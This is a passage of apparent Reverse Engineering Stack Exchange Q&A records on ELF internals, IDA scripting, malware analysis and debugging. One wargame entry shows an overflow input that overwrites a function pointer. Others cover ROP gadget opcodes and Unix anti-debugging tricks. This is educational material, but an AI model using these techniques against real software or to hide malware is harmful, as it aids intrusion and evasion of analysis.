  [16] .shstrtab         STRTAB          00000000 004170 000080 00      0   0  1
</code></pre>

<p>You can see that even though it's missing the <code>.symtab</code> section, the <code>.dynsym</code> is still present. In fact, the section table can be removed as well (e.g. with <code>sstrip</code>) and the file will still work. This is because the dynamic linker only uses the program headers (aka the segment table):</p>

<pre><code>Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  EXIDX          0x003bd8 0x00003bd8 0x00003bd8 0x00170 0x00170 R   0x4
  LOAD           0x000000 0x00000000 0x00000000 0x03d48 0x03d48 R E 0x1000
  LOAD           0x004000 0x00004000 0x00004000 0x00160 0x00aa0 RW  0x1000
  DYNAMIC        0x004000 0x00004000 0x00004000 0x000c8 0x000c8 RW  0x4
</code></pre>

<p>The <code>DYNAMIC</code> segment corresponds to the <code>.dynamic</code> section and contains information for the dynamic linker:</p>

<pre><code>Dynamic section at offset 0x4000 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [liblog.so]
 0x00000001 (NEEDED)                     Shared library: [libcutils.so]
 0x00000001 (NEEDED)                     Shared library: [libc.so]
 0x00000001 (NEEDED)                     Shared library: [libstdc++.so]
 0x00000001 (NEEDED)                     Shared library: [libm.so]
 0x0000000e (SONAME)                     Library soname: [libnetutils.so]
 0x00000010 (SYMBOLIC)                   0x0
 0x00000004 (HASH)                       0xb4
 0x00000005 (STRTAB)                     0x8e4
 0x00000006 (SYMTAB)                     0x334
 0x0000000a (STRSZ)                      1071 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000003 (PLTGOT)                     0x40c8
 0x00000002 (PLTRELSZ)                   256 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0xd1c
 0x00000011 (REL)                        0xd14
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffa (RELCOUNT)                   1
 0x00000000 (NULL)                       0x0
</code></pre>

<p>The two entries here necessary for symbol resolution are <code>STRTAB</code> and <code>SYMTAB</code>. They together make up the dynamic symbol table:</p>

<pre><code>Symbol table '.dynsym' contains 91 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00001038     0 SECTION LOCAL  DEFAULT    7 
     2: 00003144     0 SECTION LOCAL  DEFAULT    8 
     3: 00003bb4     0 SECTION LOCAL  DEFAULT    9 
     4: 0000415c     0 SECTION LOCAL  DEFAULT   13 
     5: 00004160     0 SECTION LOCAL  DEFAULT   14 
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND clock_gettime
     7: 000026e1    88 FUNC    GLOBAL DEFAULT    7 ifc_init
     8: 00000001    20 FUNC    GLOBAL DEFAULT  UND strcpy
     9: 00002d6d   140 FUNC    GLOBAL DEFAULT    7 open_raw_socket
     [...]
</code></pre>

<p>You can see that it contains both <code>UND</code> (undefined) symbols - those required by the library and imported from other .so, and the ""normal"" global symbols which are exported by the library for its users. The exported symbols have their addresses inside the library listed in the Value column.</p>
","2040"
"How to automatically rename some IDA functions from a given list?","2479","","<p>I have a text file which contains a list of function name and address pairs, structured like this :</p>

<pre><code>194C:841B LoadMessage
194C:8429 ShowDialog
...
</code></pre>

<p>Is there a way (eg: script, automation, ...) to automatically rename all relation functions of the IDA disassembly according the text file ?</p>
","<p>This way to automate things called IDAPython, its documentation is <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/"" rel=""nofollow"">here</a>:</p>

<p>1 - Save this script somewhere, remember where.</p>

<pre><code>#Not used, not debbugged, not ran even once
#Use on your own risk, beware errors

import idaapi
import idautils
import idc

def do_rename(l):
    splitted = l.split()
    straddr = splitted[0]
    strname = splitted[1].replace(""\r"", """").replace(""\n"", """")

    if straddr.find("":"") != -1: #assuming form segment:offset
        #removing segment, offset should be unique, if it isn't so, we should handle it differently
        straddr = straddr.split("":"")[1]

    eaaddr = int(straddr, 16)
    idc.MakeCode(eaaddr)
    idc.MakeFunction(eaaddr)
    idc.MakeNameEx(int(straddr, 16), strname, idc.SN_NOWARN)


if __name__ == ""__main__"":
    f = open( ""your_file_name"", ""r"")
    for l in f:
        do_rename(l)
    f.close()
</code></pre>

<p>In IDA, open File-->Script file, chose the script and run it.
Note that you should insert your file name and verify that the address is converted well. </p>

<p>Hope it gives some kind of direction.</p>
","11875"
"Can IDA Pro automatically deal with VM obfuscated binaries?","2478","","<p>VM packers like Code Virtualizer and VMProtect seem challenging to existing reverse engineering work, especially static approach like IDA Pro.</p>

<p>According to this slides</p>

<p>www.hex-rays.com/products/ida/support/ppt/caro_obfuscation.ppt</p>

<p>from Hex-rays, IDA Pro requires experienced reverse engineer to manually recognize the opcode array and understand the semantic, then decode the bytecode array..</p>

<p>I myself use IDA Pro to deal with simple quicksort program using Code Virtualizer, and I can share two pics.</p>

<p><img src=""https://i.stack.imgur.com/vZqaZ.png"" alt=""enter image description here""></p>

<p>See, I use Code Virtualizer to protect this part and IDA Pro can not go to 0X599050h.</p>

<p><img src=""https://i.stack.imgur.com/UPTnc.png"" alt=""enter image description here""></p>

<p>See, the size of relocation section has a significant growth.</p>

<p>So my questions:</p>

<ol>
<li>Can IDA Pro automatically deal with VM obfuscated binaries?</li>
<li>Any other interesting materials on the state-of-art in this area?</li>
</ol>

<p>Thank you!</p>
","<p>Regarding question #1, no IDA does not handle obfuscated binaries.</p>

<p>You might be interested by the Virtual Deofbuscator talk Jason Raber gave at Blackhat last year, he also released an IDA plugin and the source code is available.</p>

<ul>
<li>Slides :
<a href=""https://media.blackhat.com/us-13/US-13-Raber-Virtual-Deobfuscator-A-DARPA-Cyber-Fast-Track-Funded-Effort-Slides.pdf"">https://media.blackhat.com/us-13/US-13-Raber-Virtual-Deobfuscator-A-DARPA-Cyber-Fast-Track-Funded-Effort-Slides.pdf</a></li>
<li>Video : <a href=""https://www.youtube.com/watch?v=hoda99l5y_g"">https://www.youtube.com/watch?v=hoda99l5y_g</a> </li>
<li>Source code :
<a href=""https://github.com/jnraber/VirtualDeobfuscator"">https://github.com/jnraber/VirtualDeobfuscator</a></li>
</ul>
","3970"
"Why does the function pointer get overwritten even though is declared before the vulnerable buffer?","2477","","<p>I am working on <a href=""http://io.smashthestack.org:84/"" rel=""nofollow"">io-wargames</a> for fun right now, level3:</p>

<p>I do understand why there is a stack-overflow in this code <code>(strlen(argv[1])</code>), but what I don't understand is why it overflows the function pointer <code>functionpointer</code>. </p>

<p><code>functionpointer</code> is declared before <code>char buffer[50];</code> on the stack so How comes it overwrites it ??? </p>

<p>Here is the main vulnerable code: </p>

<pre><code>int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) &lt; 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf(""This is exciting we're going to %p\n"", functionpointer);
        functionpointer();

        return 0;
}
</code></pre>

<p>Here is the shell exploits the stackoverflow:</p>

<pre><code>level3@io:~$ /levels/level03 11111111
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
level3@io:~$ /levels/level03 111111111111111111111111111111111111111111111111111111111111111111111111111111111
This is exciting we're going to 0x31313100
Segmentation fault
</code></pre>

<hr>

<p>Here is the <code>objump -d</code> of the executable:</p>

<pre><code>080484c8 &lt;main&gt;:
 80484c8:       55                      push   %ebp
 80484c9:       89 e5                   mov    %esp,%ebp
 80484cb:       83 ec 78                sub    $0x78,%esp
 80484ce:       83 e4 f0                and    $0xfffffff0,%esp
 80484d1:       b8 00 00 00 00          mov    $0x0,%eax
 80484d6:       29 c4                   sub    %eax,%esp
 80484d8:       c7 45 f4 a4 84 04 08    movl   $0x80484a4,-0xc(%ebp)
 80484df:       83 7d 08 02             cmpl   $0x2,0x8(%ebp)
 80484e3:       75 17                   jne    80484fc &lt;main+0x34&gt;
 80484e5:       8b 45 0c                mov    0xc(%ebp),%eax
 80484e8:       83 c0 04                add    $0x4,%eax
 80484eb:       8b 00                   mov    (%eax),%eax
 80484ed:       89 04 24                mov    %eax,(%esp)
 80484f0:       e8 a7 fe ff ff          call   804839c &lt;strlen@plt&gt;
 80484f5:       83 f8 03                cmp    $0x3,%eax
 80484f8:       76 02                   jbe    80484fc &lt;main+0x34&gt;
 80484fa:       eb 09                   jmp    8048505 &lt;main+0x3d&gt;
 80484fc:       c7 45 a4 00 00 00 00    movl   $0x0,-0x5c(%ebp)
 8048503:       eb 74                   jmp    8048579 &lt;main+0xb1&gt;
 8048505:       8b 45 0c                mov    0xc(%ebp),%eax
 8048508:       83 c0 04                add    $0x4,%eax
 804850b:       8b 00                   mov    (%eax),%eax
 804850d:       89 04 24                mov    %eax,(%esp)
 8048510:       e8 87 fe ff ff          call   804839c &lt;strlen@plt&gt;
 8048515:       89 44 24 08             mov    %eax,0x8(%esp)
 8048519:       8b 45 0c                mov    0xc(%ebp),%eax
 804851c:       83 c0 04                add    $0x4,%eax
 804851f:       8b 00                   mov    (%eax),%eax
 8048521:       89 44 24 04             mov    %eax,0x4(%esp)
 8048525:       8d 45 a8                lea    -0x58(%ebp),%eax
 8048528:       89 04 24                mov    %eax,(%esp)
 804852b:       e8 5c fe ff ff          call   804838c &lt;memcpy@plt&gt;
 8048530:       8b 45 0c                mov    0xc(%ebp),%eax
 8048533:       83 c0 04                add    $0x4,%eax
 8048536:       8b 00                   mov    (%eax),%eax
 8048538:       89 04 24                mov    %eax,(%esp)
 804853b:       e8 5c fe ff ff          call   804839c &lt;strlen@plt&gt;
 8048540:       83 e8 04                sub    $0x4,%eax
 8048543:       89 44 24 08             mov    %eax,0x8(%esp)
 8048547:       c7 44 24 04 00 00 00    movl   $0x0,0x4(%esp)
 804854e:       00 
 804854f:       8d 45 a8                lea    -0x58(%ebp),%eax
 8048552:       89 04 24                mov    %eax,(%esp)
 8048555:       e8 02 fe ff ff          call   804835c &lt;memset@plt&gt;
 804855a:       8b 45 f4                mov    -0xc(%ebp),%eax
 804855d:       89 44 24 04             mov    %eax,0x4(%esp)
 8048561:       c7 04 24 c0 86 04 08    movl   $0x80486c0,(%esp)
 8048568:       e8 3f fe ff ff          call   80483ac &lt;printf@plt&gt;
 804856d:       8b 45 f4                mov    -0xc(%ebp),%eax
 8048570:       ff d0                   call   *%eax
 8048572:       c7 45 a4 00 00 00 00    movl   $0x0,-0x5c(%ebp)
 8048579:       8b 45 a4                mov    -0x5c(%ebp),%eax
 804857c:       c9                      leave  
 804857d:       c3                      ret    
 804857e:       90                      nop
 804857f:       90                      nop
</code></pre>

<hr>

<p>I see that the complier reserved in the main's prolog function frame <code>0x78</code> bytes for the local main function variables. </p>
","<p>The compiler did put the function pointer after the buffer.</p>

<p>In the disassembly, check the <code>memcpy</code> call:</p>

<pre><code>8048525:  lea    -0x58(%ebp),%eax
8048528:  mov    %eax,(%esp)
804852b:  call   804838c &lt;memcpy@plt&gt;
</code></pre>

<p>The first argument to <code>memcpy</code> (the buffer's address) is at <code>[esp+0]</code> and you can see that the value of <code>ebp-0x58</code> is being put there.</p>

<p>Next is the function call at the end of the function:</p>

<pre><code>804856d:  mov    -0xc(%ebp),%eax
8048570:  call   *%eax
</code></pre>

<p>You can see that the address being jumped to is loaded from <code>[ebp-0xc]</code> which is 0x4c (76) bytes after the beginning of the character buffer.</p>

<p>Here's a stack layout from IDA which will hopefully make things clearer:</p>

<pre><code>-00000058 buffer          db 76 dup(?)
-0000000C functionpointer dd ?
-00000008 var_8           dd ?
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 argc            dd ?
+0000000C argv            dd ?
</code></pre>

<p>Offsets in the leftmost column are ebp-relative. Memory addresses increase downwards, so it's obvious that writing too much data into <code>buffer</code> will overwrite the function pointer (and then the return address).</p>

<p>MSVC actually uses a mitigation against such attack - it <a href=""http://msdn.microsoft.com/en-us/magazine/cc337897.aspx"" rel=""nofollow noreferrer"">reorders character buffers</a> to be placed after all other variables:</p>

<p><img src=""https://i.stack.imgur.com/vAW50.gif"" alt=""enter image description here""></p>
","2211"
"windbg: How to determine the opcode for an assembly language instruction or set of instructions","2476","","<p>I am working on an assignment to perform an exploit using a rop chain.
While I understand the basics behind rop, I don't know how to convert instructions like</p>

<pre><code>xchg eax, esp; retn;
</code></pre>

<p>to their opcodes.</p>

<p>I tried using:</p>

<pre><code>0:005&gt; a
input&gt; xchg eax,esp
</code></pre>

<p>but the address given just points to a totally different kind of instruction in my program.
I believe it was an add command.</p>
","<p><a href=""http://www.woodmann.com/collaborative/tools/index.php/RTA"" rel=""nofollow noreferrer"">RTA</a> is an easy to use tool that allows you to enter either opcodes or mnemonics and will convert them from one to the other.</p>

<p>In the example below, I entered <code>XCHG EAX,ESP</code> and <code>RETN</code> on the right, and RTA produced <code>94</code> and <code>C3</code> on the left:</p>

<p><img src=""https://i.stack.imgur.com/FLGrT.png"" alt=""RTA""></p>

<p>If, on the other hand, you really want to use WinDbg, then you need to do the following:</p>

<ol>
<li>Load a target into WinDbg</li>
<li>Type <kbd>a</kbd>, <kbd>Enter</kbd> to enter Input mode</li>
<li>Type your mnemonics (for example, <code>xchg eax,esp</code>), <kbd>Enter</kbd></li>
<li>Press <kbd>Enter</kbd> again to escape Input mode</li>
<li>Type <kbd>u</kbd>, <kbd>Enter</kbd> to show the disassembly of what you just assembled</li>
</ol>

<p>​See below for an example:</p>

<pre><code>0:000&gt; a
778e05a6 xchg eax,esp
xchg eax,esp
778e05a7 

0:000&gt; u
ntdll!LdrVerifyImageMatchesChecksum+0x633:
778e05a6 94              xchg    eax,esp
</code></pre>
","6642"
"How to figure out which imported function(s) in a virus determine its behaviour?","2473","","<p>I want to know how to find the functions which is interesting in malware tools.
For example, I have a sample of unknown virus (this sample is <code>lab01-01.exe</code> in the book practical malware analysis <code>lab1-01.dll</code>). It is not packed.</p>

<p>I am supposed to find out what does this malware by knowing the imported DLLs and the functions it uses. Here are the imported functions in the executable file <code>lab01-01.exe</code>:</p>

<pre><code>KERNEL32.dll :
CloseHandle
UnmapViewOfFile
IsBadReadPtr
MapViewOfFile
CreateFileMappingA
CreateFileA
FindClose
FindNextFileA
FindFirstFileA
CopyFileA
</code></pre>

<p>And from <code>MSVCRT.dll</code>:</p>

<pre><code>_getmainards
_p_initenv
_p_commode
_p_fmode
_set_apps_typr
_setusermatherr
_adjust_fdiv
_controlfp
_except_handler3
_exit
_initterm
_stricmp
_XcptFilter
exit
malloc
</code></pre>

<p>But, I didn't find any function imported from <code>lab01-01.dll</code>. </p>

<p>I also want to know why, although the book mentioned that both the executable file and DLL are related (it should be imported).</p>
","<p>Dlls can not only be imported statically but also dynamically. For the dynamic case, it uses <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175(v=vs.85).aspx"" rel=""nofollow""><code>LoadLibrary</code></a> to load the dll, and <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx"" rel=""nofollow""><code>GetProcAddress</code></a> to resolve the address of the function it needs. </p>

<p>If the dlls are imported statically, then a simple dependency walking will give you information about each dll its imports and also the function within each of them it uses. This information is actually present in the PE header which a tool like <em>dependency walker</em> shows you.</p>

<p>If the dll is imported dynamically, then walking through the imports will not give you any idea about the dlls and functions it uses. In such a case, debug the application (if possible). Set a breakpoint on <code>kernel32.LoadLibraryA</code> / <code>kernel32.LoadLibraryW</code> or even the undocumented <code>ntdll.LdrLoadDll</code> and run the app. When the breakpoint is hit you immediately know which dll it is trying to import. Similarly setting a breakpoint on <code>GetProcAddress</code> will reveal the function the application wants to use.</p>

<p>I am talking about the simplest case here. You may encounter malware which bypasses the LoadLibrary mechanism totally, by implementing its own PE loader. See <em><a href=""http://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/"" rel=""nofollow"">this</a></em> page for such an example. Similarly <code>GetProcAddress</code> can be bypassed too, by manually parsing the import tables.</p>

<p><a href=""http://books.google.co.uk/books?id=FQC8EPYy834C&amp;lpg=PP1&amp;dq=practical%20malware%20analysis&amp;pg=PA453#v=twopage&amp;q&amp;f=true"" rel=""nofollow"">This chapter</a> from the book <em>Practical Malware Analysis</em>  gives you a list of some important Windows API functions which can be used to get some insight into the workings of a malware.</p>
","5950"
"Is learning assembly enough to become a malware analyst?","2464","","<p>I am a C/C++ developer and I have started learning assembly language programming with the goal to become a malware analyst. </p>

<p>I know it is not enough to just know how to read assembly to become a malware analyst. But won't it help a lot and make the remaining things easier?</p>
","<p>To be a malware analyst, the minimum knowledge typically needed is:</p>

<ul>
<li>Assembly language</li>
<li>Operating system internals</li>
<li>Deobfuscation and anti-anti-debugging techniques</li>
</ul>

<p>Obviously, there are other useful areas of knowledge for malware analysis (like an understanding of network protocols, exploit analysis techniques, knowledge of VB P-code and JavaScript and .NET languages, etc.), but it looks like you're making progress ;)</p>

<p>Most of the things you'll need to know you'll learn along the way. For example, you may come across a malware sample that exploits Adobe Flash player. This will give you the opportunity to learn about the SWF file format, ActionScript source and bytecode, etc.</p>
","3262"
"How can I set breakpoint and get value of a register with IDApython","2453","","<p>How can I set a breakpoint and get the value of the <code>EAX</code> register with IDApython?</p>

<p>I want to set a breakpoint, for example at address <code>00b27223</code>, and at each break before execution of that specific address I want to get the value of the <code>EAX</code> register as text.</p>

<p><a href=""https://i.stack.imgur.com/LQhPa.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/LQhPa.png"" alt=""example""></a></p>
","<p>I can think of two methods to achieve this:</p>

<ol>
<li>Using <code>RunTo</code>.</li>
<li>Setting a breakpoint, hooking debugger events and implementing <code>dbg_bpt</code></li>
</ol>

<h1>1. Using <code>RunTo</code></h1>

<p>This is nearly trivial to do, but does not give the same amount of control as the second approach. It might be better for quick and dirty type of solutions, if that's what you're after.</p>

<p>Calling <code>idc.RunTo(ea)</code> will execute the process until an <code>ea</code> is reached, allowing you to then call <code>idc.GetRegValue(name)</code> to get the value of <code>EAX</code>.</p>

<p>Certain conditions (like an exception thrown or a different breakpoint being hit) will cause <code>RutTo</code> to return before the provided <code>ea</code> is reached. You could then call <code>idc.GetDebuggerEvent</code> to figure out what happened, but if you're gonna do that I suggest switching to the second approach.</p>

<p>Note <code>RunTo</code> will also start up a process if there's no running process.</p>

<h1>2. Setting a breakpoint, hooking debugger events and implementing <code>dbg_bpt</code></h1>

<p>This is the safer and would be my recommended approach, while being harder to implement it allows properly handling other breakpoints and more control.</p>

<p>For this, you'll have to do three things:</p>

<ol>
<li>Set up a breakpoint at given address.</li>
<li>Monitor for the breakpoint's trigger.</li>
<li>And finally act upon it.</li>
</ol>

<h2>Set up a breakpoint at given address</h2>

<p>The most basic method of achieving this is by calling the <code>idc.AddBpt(ea)</code>, which sets a software on execution breakpoint at that address.</p>

<p>Additional methods you could use include:</p>

<ol>
<li><code>idc.AddBptEx(ea, size, bpttype)</code> to have more control on the type of breakpoint you're creating.</li>
<li><code>idc. SetBptAttr(address, bptattr, value)</code> to set the breakpoint's available attributes.</li>
<li><code>idc.SetBptCnd(ea, cnd)</code> / <code>idc. SetBptCndEx(ea, cnd, is_lowcnd)</code> to set the breakpoint's trigger condition.</li>
</ol>

<p>Read the documentation for the exact details.</p>

<h2>Monitor for the breakpoint's trigger</h2>

<p>For that, you'll need to install a Debugger Hooking class (any class that inherits <code>idaapi.DBG_Hooks</code>), which implements the <code>dbg_bpt(tid, ea)</code> method, which describe the thread id and linear address in which the breakpoint triggered. Returning 0 from <code>dbg_bpt</code> should prevent IDA from notifying the user it was triggered (assuming you'll handle it internally).</p>

<p>You'll have to instantiate your class and call the instance's <code>Hook</code> and <code>Unhook</code> methods for it to actually function. Please note it's better practice to install the hooks before creating the breakpoint.</p>

<h2>And finally act upon it</h2>

<p>While the debugger is running, you can call <code>idc.GetRegValue(name)</code> providing the register name to receive it's immediate value at that time.</p>
","13419"
"Debugger hiding plugin for WinDbg?","2452","","<p>Are there any good WinDbg hiding plugins like OllyDbg's? Or a plugin that's open source and still in development for this purpose?</p>
","<p>I don't think such a plugin currently exists. However, if you're willing to implement a minimal windbg backend, you could extend <a href=""http://code.google.com/p/uberstealth"" rel=""nofollow"">uberstealth</a>, which unfortunately I've never come to finish as a project (actually I think anti-debugging is a dead anyway, but that's another story ;-)).
It's essentially IDAStealth, but with all debugger specific functionality factored out (there's a backend for IDA and Olly2). All you'd have to do is write a backend for Windbg (and fix the remaining bugs, I could help you with that though), all other code is debugger independent.
Should be less than a few dozen lines of code.</p>
","2085"
"Open-Source library for Complete Binary Disassembly","2442","","<p>One of the major hurdles of x86 disassembly is separating code from data. All available open-source disassembly library only perform a straight line disassembly (starts from the top and skips errors by 1 byte), compared with OllyDBG which apparently uses a control flow disassembly (using opcodes like CALL and JMP) or IDA using heuristics and emulation. However these two aren't open-source.</p>

<p>My question is, is there any open-source library or project that uses a better technique than simple straight line disassembly (control flow or heuristics based) ?</p>

<p>I stumbled upon a paper using a machine learning approach ? is there an open-source implementation of this approach ?</p>
","<p><a href=""http://radare.org/"" rel=""noreferrer"">Radare 2</a> is a GPL software, with a good API, and is not using linear disassembling.</p>

<p>See visual mode (Vp command) example:
<img src=""https://i.stack.imgur.com/B3077.png"" alt=""example r2 x86 session""></p>
","3448"
"BYTE3, does it mean the third or fourth byte of an int? IDB file that's already supplied","2437","","<p>I've got a program that i'm trying to debug a little bit by trying to make sense of a function or two, there's already some info that i've downloaded via a idb file and it's helped me get somewhere. But i'm kind of stuck on a part where i've got something like this:</p>

<pre><code>BYTE3(v1) = 0;
</code></pre>

<p>This is from the ida hex-rays plugin which has made some nice c-pseudo code for me. I can't double click the function and get it translated in some way so i don't really know how to understand what it does, my guess is that it takes either the third or fourth byte of an int. So my question is, how would i be able to find this function and look at it's disassembly at least if it can't be translated by hex-rays? The signature if that helps at all looks like this according to ida: <code>_BYTE __fastcall(int)</code></p>
","<p>All Hex-Rays macros are defined in <strong>&lt;IDA directory&gt;\plugins\defs.h</strong></p>

<p>For <code>BYTE3(x)</code>:</p>

<pre><code>...
#define BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))
...
#define BYTE3(x)   BYTEn(x,  3)
...
</code></pre>

<p>So <code>BYTE3(x)</code> yields <code>(*((_BYTE*)&amp;(x)+3))</code>, which effectively means the fourth byte of the value <code>x</code>.</p>
","2659"
"How to break on an Android JNI function with IDA Pro Debugger","2422","","<p>I have an android application that uses a shared library which I would like to step through with a debugger.  I've had success using IDA 6.3 to debug executables with the <code>android_server</code> debug server included with IDA but haven't gotten it to work with shared objects yet.  </p>

<p>For a specific example, suppose I have the following Java code (This comes from the hellojni example in the Android NDK):</p>

<pre><code>System.loadLibrary(""hello-jni"");
tv.setText( stringFromJNI() );
</code></pre>

<p>With the JNI C code as:</p>

<pre><code>jstring
Java_com_example_hellojni_HelloJni_stringFromJNI( JNIEnv* env, jobject thiz )
{
        return (*env)-&gt;NewStringUTF(env, ""Hello from JNI !"");
}
</code></pre>

<p>If the java code is run only when the application starts up, how can I break in the function <code>Java_com_example_hellojni_HelloJni_stringFromJNI</code>?</p>
","<p>There are two options I can see.</p>

<ol>
<li><p>Start the Dalvik VM manually using <code>app_process</code>. The command line seems to be something like (see <code>am</code> script source):</p>

<pre><code>app_process /system/bin com.android.commands.am.Am start -a &lt;ACTION&gt;
</code></pre></li>
<li><p>Put an endless loop in the beginning of your JNI method, run the app, attach to the new process and skip the loop manually in the debugger.</p></li>
</ol>
","1969"
"Debugging malware that will only run as a service","2415","","<p>I'm trying to debug a malware sample that installs to a system as service and then will only start if it starts as a service. Other functions are still available without the service start, like configuring or install under a different name. </p>

<p>I'm trying to catch the network communications the malware is sending and receiving as soon as it starts as a service. If I attach to a running service/process with Immunity it already has sent the network packets and received, and I've missed what it has done with them. If I try to start it any other way I get the following error: <code>ERROR_FAILED_SERVICE_CONTROLLER_CONNECT</code> (00000427). </p>

<p>Is there another way to go about this? Or some workaround? I'm fairly new to this so I certainly be missing some obvious.</p>
","<p>You can use the <a href=""http://blogs.msdn.com/b/junfeng/archive/2004/04/28/121871.aspx"">Image File Execution Options</a> registry key to specify a debugger which will be launched automatically when the executable starts.</p>

<p>You can also always do the ancient trick of patching an endless loop (<code>EB FE</code>) at the entry point or somewhere later. This would allow you to attach at you leisure, restore the patched bytes and resume the execution.</p>
","2021"
"How do you compare C source code with the corresponding binary's assembly in IDA Pro?","2407","","<p>I'm wondering if there's a way to compare source code to the disassembled assembly in IDA Pro? (e.g. I compile hello.c in Linux then open the binary in IDA Pro in OS X, and would like to compare the assembly with the source so make it easier to find out what's going on). Does such a feature exist?</p>

<p><strong>ADDED From Comment:</strong>
By the way, I forgot to mention, I am in OS-X and the binary was compiled by Lunux</p>
","<p>You can compile your file with <a href=""http://dwarfstd.org/"" rel=""nofollow"">DWARF</a> information in it, since IDA supports it:</p>

<p><img src=""https://www.hex-rays.com/products/ida/6.4/shots/dwarf_x86.png"" alt=""DWARF in IDA""></p>
","4360"
"Decoding a blob","2405","","<p>I have a proprietary file format that is a compressed database file. This database file has a few dozen tables. Each of these tables only have a few records, many of them don't have any records at all. A few of these tables contain fields that are stored as blobs of hex data. These blobs account for 99% of the disk space of the overall database file.</p>

<p>As far as I can tell, these blobs are not compressed data (by using unix 'file' command). I have tried finding known values in these blobs by exporting values from the proprietary software, converting to hex and searching for that value in the database file. So far I haven't been able to find any matches. The problem is that the software can export in a myriad of formats and I'm not sure which one (if any) the data would be stored in.</p>

<p>Most of the tables contain checksum fields, which I believe, are responsible for my inability to edit the blobs and see what changes in the proprietary software. This combined with the fact that I cannot directly change the values that I wish to extract from the proprietary files leaves me in a difficult position.</p>

<p>Does anybody know any tricks for trying to tease out time series data from binary data?</p>

<p><strong>Edit</strong>
<a href=""http://pastelink.me/dl/4e6d0c#sthash.Co5cEOJS.dpuf"" rel=""nofollow"">This zip file</a> contains 2 hex blobs (index and value) from the decompressed database and the same data as it is exported from the program.</p>
","<p>After seeing the test files (thanks!):</p>

<p>... too easy :)</p>

<p>In <code>value.hex</code>, the first dword appears to be a total file length; the second dword the data length. The third and fourth dwords may be flags of some kind and do not appear to point to data. This lops off the first 16 bytes, hence my guess the 2nd dword is 'data length'.</p>

<p>Right after this header comes that familiar pair <code>78 9C</code> again, so I brought out my zlib decoder wrapper. Unpacking <code>value.hex</code>, starting at offset 0x10, and using <code>TINFL_FLAG_PARSE_ZLIB_HEADER</code> (as I am using <code>miniz.c</code> for eaze) gave me a correct unpacking result and a data file of 33,208 bytes long.</p>

<p>Inspecting this with 0xED shows this file consists entirely out of <em>double values</em> (8 bytes each); the first few are</p>

<pre><code>0.991932
0.991931
0.991932
0.991932
0.991932
0.991933
</code></pre>

<p>(okay, there appears to be a pattern here -- the devil is in the last few digits which 0xED doesn't show, they are not all the same values).</p>

<p>The second file, <code>index.dat</code>, also unpacks correctly and gives another long list of double values, this time clearly going up:</p>

<pre><code>0.0000
0.0082
0.0163833
0.0245667
</code></pre>

<p>I didn't cross-reference these values against the XLS file you provided, I assume you can work that out from here.</p>

<p>I only unpacked until I got a positive result back, I did not check if there are more data packets (compressed or otherwise) following the first one and you should verify using the end result of your own favourite decompression routine.</p>

<hr>

<p>Just as I was heading to bed, it struck me that the 3rd and/or 4th dwords in the header (weren't they the same anyway?) may be the 'unpacked' length.</p>
","3053"
"Anti-debug techniques on Unix platforms?","2404","","<p>I am trying to scan all possible techniques to disrupt the usage of a debugger on a Unix platform (ie POSIX and a bit more).</p>

<p>I am thinking about techniques such as the <code>PTRACE</code> test at the beginning of a program (or at various points of its execution), the insertion of fake breakpoints (eg <code>int3</code>/<code>0xcc</code> x86 opcode) or time checks. But, also global strategies defined on the program to slow down the analysis of the program.</p>

<p>For now, all the techniques I found on Internet were easily worked around as soon as the anti-debug technique has been understood. So, I wonder if there are stronger ones.</p>
","<p>Here's some I've seen or heard about:</p>

<ul>
<li><p>Stripping the section headers. A simple and fully legal action that stops GDB dead in its tracks. Does not work against some other debuggers (e.g. IDA). Can be done using the <a href=""http://www.muppetlabs.com/~breadbox/software/elfkickers.html""><code>sstrip</code></a> tool.</p></li>
<li><p>Using <code>syscall</code> function or direct syscalls instructions instead of calling specific functions like <code>ptrace()</code>. Can be defeated by setting the breakpoint on <code>syscall</code> function or just stepping through the file, but may be non-obvious if you don't know about it.</p></li>
<li><p>Performing anti-debugging actions before <code>main()</code>, e.g. in constructors of global objects or using <code>__attribute__((constructor))</code>. Since GDB usually sets initial breakpoint in <code>main()</code>, it takes care of the default situation. Workaround is simple: put breakpoint on the actual file's entrypoint (<code>info file</code> in GDB).</p></li>
<li><p>Sending itself debugging-related signals like <code>SIGTRAP</code>. (Note that this can be ignored with <code>handle SIGTRAP nostop</code> in GDB.)</p></li>
<li><p>Forking and tracing itself with <code>ptrace</code>.</p></li>
<li><p>Fake breakpoints insertion: Inserting int3/0xcc will force the debugger to stop on these bytes as they will be treated as software breakpoints. If they are numerous it might slow down considerably the analysis.</p></li>
<li><p>Breakpoint detection: I saw this technique in this <a href=""http://www.stonedcoder.org/~kd/lib/14-61-1-PB.pdf"">paper</a>, you can attach a function that will be triggered when a breakpoint is encoutered. This paper covers also some other tricks.</p></li>
</ul>
","93"
"Translation from ARM assembly to LLVM IR","2402","","<p>Is there publicly available solution for translation of ARM assembly to LLVM IR?</p>
","<p>From <a href=""http://lists.cs.uiuc.edu/pipermail/llvmdev/2008-March/012953.html"" rel=""nofollow"">http://lists.cs.uiuc.edu/pipermail/llvmdev/2008-March/012953.html</a>:</p>

<blockquote>
  <p>During Google Summer of Code 2007 I was working on llvm-qemu, which
  translates from <strong>ARM machine code to LLVM IR</strong> (at basic block level) and
